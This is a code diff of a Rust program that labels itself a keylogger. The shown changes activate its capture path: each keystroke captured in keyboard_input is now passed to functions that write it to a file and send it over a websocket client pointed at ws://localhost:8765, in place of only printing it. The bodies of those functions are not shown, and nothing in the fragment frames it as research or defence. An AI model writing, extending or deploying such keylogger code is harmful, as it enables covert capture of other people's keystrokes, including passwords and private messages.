@@ -7,9 +7,8 @@ use url::Url;
 const WS_ADDRESS:&str = "ws://localhost:8765";
 
 fn passthrough_key(event: &str) {
-    println!("{:?}", event);
-    // file_writer(event);
-    // ws_client(event);
+    file_writer(event);
+    ws_client(event);
 }
 
 fn file_writer(event: &str) {
@@ -32,7 +31,7 @@ fn ws_client(event: &str) {
 }
 
 fn main() {
-    println!("Keylogger Running");
+    println!("Keylogger Running =>");
     keyboard_input();
 }
 
@@ -45,10 +44,8 @@ fn keyboard_input() {
             },
             None => {println!("{:?}", event)},
         };
-        println!("{:?}", &c_action);
+        passthrough_key(c_action.to_string().as_str());
     });
-
-
 
     // Bind all mouse buttons to a common callback event.
     MouseButton::bind_all(|event| {
